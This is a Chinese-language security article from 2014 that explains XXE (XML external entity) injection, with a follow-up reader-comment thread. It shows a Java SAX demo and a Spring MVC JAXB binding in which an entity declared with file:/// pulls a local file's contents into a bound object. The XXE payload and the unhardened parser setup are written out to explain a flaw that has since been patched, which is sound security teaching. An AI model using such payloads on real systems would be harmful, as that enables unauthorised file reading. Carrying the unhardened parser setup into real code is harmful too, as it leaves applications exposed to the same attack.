<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Spring MVC xml绑定pojo造成的XXE</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Nebula</a> <span class="bull">·</span> <time title="2014/05/08 12:20" ui-time="" datetime="2014/05/08 12:20" class="published ng-binding ng-isolate-scope">2014/05/08 12:20</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>什么是XXE ? 就是我们所说的所谓xml实体注入.这里不去讲所有xml语法规范了,稍微就说一下XML entity:</p><pre><code>entity翻译为"实体"。它的作用类似word中的"宏"，也可以理解为DW中的模板，你可以预先定义一个entity，然后在一个文档中多次调用，或者在多个文档中调用同一个entity(XML定义了两种类型的entity。一种是我们这里说的普通entity，在XML文档中使用；另一种是参数entity，在DTD文件中使用。)。  
</code></pre><p>entity的定义语法为:</p><pre><code>#!xml
&lt;!DOCTYPE filename
[  
    &lt;!ENTITY entity-name "entity-content"  
]&gt;
</code></pre><p>如果要引用一个外部资源:</p><pre><code>#!xml
&lt;!DOCTYPE test
[  
    &lt;!ENTITY test SYSTEM "http://xxx.xxx.com/test.xml"&gt;   
]&gt; 
</code></pre><p>ENTITY可以使用SYSTEM关键字,调用外部资源,而这里是支持很多的协议,如:http;file等</p><p>然后,在其他DoM结点中可以使用如:<code>&amp;test;</code>引用该实体内容.</p><p>那么,如果在产品功能设计当中,解析的xml是由外部可控制的,那将可能形成,如:文件读取,DoS,CSRF等漏洞.</p><p>这里只介绍文件读取漏洞,其他可以自己google了解.</p><h2>0x01 原理</h2><hr><p>规范没有问题,xml解析器有些也没有问题,有问题的是使用他的人.</p><p>java SAX解析器 demo:</p><p>Test.java</p><pre><code>#!java
public static void main(String[] args) throws  Exception {   
    SAXReader reader = new SAXReader();  
    //禁止  
    //reader.setFeature("http://xml.org/sax/features/external-general-entities", true);  
    Document dom = reader.read("E:/1.xml");  
    Element root = dom.getRootElement();  
    Iterator&lt;Element&gt; it = root.elementIterator();  
    while (it.hasNext()) {  
        Element elements = it.next();  
        System.out.println(elements.getText());  

    }  
}  
</code></pre><p>解析的xml,1.xml:</p><pre><code>#!xml
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE test
[&lt;!ELEMENT test ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///E:/1.log" &gt;]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre><p>实体调用的资源，1.log：</p><pre><code>XXE test!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
</code></pre><p>先说一点,解析器一般会支持所有xml规范的.使用file协议,理论上,我们至少可以读取到当前系统的任意文件内容.如:读取E盘符下的1.log文件内容.</p><p>然后被root的子节点,name内容域引用.解析结果,如图：</p><p><img alt="2014050722403743880.png" img-src="34f54af0ffd2e0e61a4c0efecef39560a9b5554c.jpg"></p><p>接下来讲，spring MVC在xml格式到java对象反序列化中，可能存在的XXE 形成的文件读取：</p><p>spring 是提供xml请求内容绑定到pojo的功能（也可以理解成javabean什么的（有区别，可以自己去看看），spring  在这里规范化了，所以就跟着叫），用得比较多的还有表单绑定，json绑定。</p><p>spring mvc JAXB xml to pojo unMarshaller  demo:</p><p>spring-servlet.xml：</p><pre><code>#!xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt;  
&lt;beans xmlns="http://www.springframework.org/schema/beans"  
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
 xmlns:p="http://www.springframework.org/schema/p"  
 xmlns:context="http://www.springframework.org/schema/context"  
 xsi:schemaLocation="http://www.springframework.org/schema/beans  
  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd  
  http://www.springframework.org/schema/context  
  http://www.springframework.org/schema/context/spring-context-3.0.xsd"&gt;  
    
 &lt;context:component-scan base-package="net.spring.controller" /&gt;   
   
   
    &lt;bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter"&gt;  
        &lt;property name="messageConverters"&gt;  
            &lt;list&gt;  
                &lt;ref bean="stringHttpMessageConverter" /&gt;  
                &lt;ref bean="jsonHttpMessageConverter" /&gt;  
                &lt;ref bean="marshallingHttpMessageConverter" /&gt;  
            &lt;/list&gt;  
        &lt;/property&gt;  
    &lt;/bean&gt;  
&lt;bean id="stringHttpMessageConverter" class="org.springframework.http.converter.StringHttpMessageConverter" /&gt;   
&lt;bean id="jsonHttpMessageConverter" class="org.springframework.http.converter.json.MappingJacksonHttpMessageConverter" /&gt;  
&lt;bean id="marshallingHttpMessageConverter" class="org.springframework.http.converter.xml.MarshallingHttpMessageConverter"&gt;  
        &lt;constructor-arg ref="jaxbMarshaller" /&gt;  
        &lt;property name="supportedMediaTypes" value="application/xml"&gt;&lt;/property&gt;  
&lt;/bean&gt;  
&lt;bean id="jaxbMarshaller" class="org.springframework.oxm.jaxb.Jaxb2Marshaller"&gt;  
        &lt;property name="classesToBeBound"&gt;  
            &lt;list&gt;  
                &lt;value&gt;net.spring.controller.User&lt;/value&gt;  
            &lt;/list&gt;  
        &lt;/property&gt;  
&lt;/bean&gt;  
&lt;/beans&gt;  
</code></pre><p>HelloWorldController.java：</p><pre><code>#!java
import org.springframework.stereotype.Controller;  
import org.springframework.web.bind.annotation.RequestBody;  
import org.springframework.web.bind.annotation.RequestMapping;  
import org.springframework.web.servlet.ModelAndView;  

@Controller  
public class HelloWorldController {   
    @RequestMapping("/hello")  
    public  ModelAndView helloWorld(@RequestBody User user) {  

        System.out.println("xxxxxxxxxx"+user.getName());  
        return new ModelAndView("hello", "user", user);   
    }   
} 
</code></pre><p>User.java（xml绑定的pojo）：</p><pre><code>#!java
import javax.xml.bind.annotation.XmlElement;  
import javax.xml.bind.annotation.XmlRootElement;  

@XmlRootElement(name="user")    
public class User {  
    private String name;  

    public String getName() {  
        return name;  
}  
@XmlElement  
    public void setName(String name) {  
        this.name = name;  
    }  
}   
</code></pre><p>发包，xml绑定pojo,如图:</p><p><img alt="2014050723155955348.png" img-src="dd3253eddae309e442e98df78dda0f0d333f8276.jpg"></p><p>pojo User对象的name属性被污染，如图：</p><p><img alt="2014050723180180429.png" img-src="d4928faa4d8794bcc3dc1934e8afce0ab9e2d990.jpg"></p><p>如果，攻击者最终能看到这个name值（直接显示到页面或存储到数据库再现实到页面什么的），就是文件读取漏洞了！</p><p>不管是其他语言或场景，原理就这么回事。</p><p>spring 早已经修补，这里主要给个漏洞场景，现在基本没什么危害吧？因为这个功能使用不常见，但走在前面的框架使用者肯定会使用这个功能，可能需要等个十年左右：</p><p>https://jira.spring.io/browse/SPR-10806</p><p>当然，还存在一个小而很有意思的问题，过一段时间的文章中可能会讲到。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141029134414dab631e232f29abd6908a1eacf4f6ae3.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">iv4n</span> <span class="reply-time">2014-09-10 17:17:45</span></div><p></p><p>虽不懂java，不过漏洞不错，看了下StAX的修补方案，明显有问题，不过在3.2.6好像还是修复了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-08-08 00:40:36</span></div><p></p><p>Good job 你是一个安全研究的程序猿</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2014-05-09 18:40:17</span></div><p></p><p>昨天发的某站提供的xml格式化存在实体注入漏洞。在群里面发的测试：http://p2j.cn/?p=1269</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">守望</span> <span class="reply-time">2014-05-09 10:09:18</span></div><p></p><p>赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">apache</span> <span class="reply-time">2014-05-08 16:44:31</span></div><p></p><p>为什么在 http 头 能拿到 xml ？ 这里不懂， 你直接访问到了他的 配置文件吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2014-05-08 16:38:00</span></div><p></p><p>大概懂了一点点- -</p><p></p></div></div></div></div></div></main>